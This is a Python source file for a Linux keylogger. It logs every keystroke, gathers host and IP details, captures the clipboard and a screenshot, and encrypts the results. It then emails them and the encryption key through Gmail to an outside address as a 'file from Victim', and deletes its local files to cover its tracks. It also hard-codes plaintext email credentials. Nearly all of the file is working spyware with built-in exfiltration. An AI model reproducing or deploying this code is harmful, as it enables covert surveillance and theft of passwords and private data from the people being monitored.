
# Disclaimer:-
# This KeyLogger works for only Linux operating systems


"""Reason:-
	Each operating system has a different way to manage keyboard input, and for that reason. It's almost impossible to find a Portable KeyLogger, that's work all operating systems. So this supports only for linux-based systems"""


#Importing Required Libaries
import pynput
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import os
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
from datetime import datetime
import subprocess


#Declaring Files
keys_information ="Key-log.txt"
system_information = "system-info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information_e = "Key-log_E.txt"
system_information_e = "system_E.txt"
clipboard_information_e = "clipboard_E.txt"
Cryptokey = "KEY.txt"

filepath = "//tmp//pythonkeylogger//"
os.mkdir(filepath)

email_address = "dycreations9653@gmail.com"
password = "ruletheworld"
toaddr = "anonymous.modernninja@gmail.com"

count = 0
keys = []


def on_press(key):
    global keys, count, now
    print(key," Pressed")
    now = datetime.now()
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filepath + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write("\t\t:")
            f.write(str(now))
            f.write("\n")
            f.close()


def computer_information():
    with open(filepath + system_information, 'a') as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyaddr(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')
        except Exception:
            f.write("couldnt get public ip  address")
        f.write("processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP address: " + str(ipaddr) + '\n')


computer_information()


def getClipboardData():
    p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE)
    retcode = p.wait()
    data = p.stdout.read()
    with open(filepath + clipboard_information, 'a') as f:
        k = str(data)
        f.write(k)
    return data


def screenshot():
    im = ImageGrab.grab()
    im.save(filepath + screenshot_information)


def email(filename, attachement, toaddr,body):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "LogFiles"

    b = "  file from Victim"
    body=body+b
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachement = open(attachement, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachement).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
    print("Send mail 📨")


key = Fernet.generate_key()
fernet = Fernet(key)
with open(filepath + Cryptokey, 'wb') as f:
    f.write(key)


def encryptfile(information_file, encrypted_file):
    information_file = information_file
    encrypted_file = encrypted_file
    with open(filepath + information_file, 'rb') as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(filepath + encrypted_file, 'wb') as f:
        f.write(encrypted)


def on_release(key):
    if key == Key.esc:
        screenshot()
        getClipboardData()
        encryptfile(keys_information,keys_information_e)
        encryptfile(system_information,system_information_e)
        encryptfile(clipboard_information,clipboard_information_e)
        email(keys_information_e, filepath + keys_information_e, toaddr, keys_information)
        email(system_information_e, filepath + system_information_e, toaddr, system_information)
        email(clipboard_information_e, filepath + clipboard_information_e, toaddr, clipboard_information)
        email(screenshot_information, filepath + screenshot_information, toaddr, screenshot_information)
        email(Cryptokey, filepath + Cryptokey, toaddr, Cryptokey)
        os.remove(filepath + keys_information)
        os.remove(filepath + system_information)
        os.remove(filepath + clipboard_information)
        os.remove(filepath + keys_information_e)
        os.remove(filepath + system_information_e)
        os.remove(filepath + clipboard_information_e)
        os.remove(filepath + screenshot_information)
        os.remove(filepath + Cryptokey)
        os.rmdir(filepath)
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:
    print("Ready to trace 👣")
    Listener.join()





